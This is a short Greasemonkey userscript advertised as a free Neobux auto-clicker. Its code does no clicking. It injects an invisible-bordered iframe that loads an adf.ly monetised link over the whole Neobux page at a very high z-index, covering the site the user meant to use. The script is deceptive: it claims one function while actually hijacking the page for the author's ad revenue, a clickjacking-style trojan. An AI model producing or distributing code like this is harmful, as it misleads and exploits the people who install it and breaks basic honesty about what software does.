// ==UserScript==
// @name         Free Neobux Auto Click Desember 2012
// @description                  Free Neobux Auto Click Desember 2012
// @description        Neobux Auto Click
// @include         http://neobux.com/*
// @include         http://*.neobux.com/*
// @include         https://neobux.com/*
// @include         https://*.neobux.com/*
// @exclude         http://*.channel.neobux.com/*
// @exclude         https://*.channel.neobux.com/*
// @exclude         https://www.neobux.com/login.php
// @exclude         https://neobux.com/login.php
// @exclude         http://neobux.com/login.php
// @author         Gigxon
// @version         1
// @versionnumber   1
// @namespace      http://userscripts.org/scripts/show/151951
// ==/UserScript==
//

var el = document.createElement("iframe");
el.setAttribute('id', 'ifrm');
document.body.appendChild(el);
el.setAttribute('src', 'http://adf.ly/EM9fa');
el.setAttribute('style', 'border:0px;z-index:99999;position:absolute;top:0px;left:0px;');
el.setAttribute('width', '100%');
el.setAttribute('height', '9999px');
el.setAttribute('scrolling', 'no');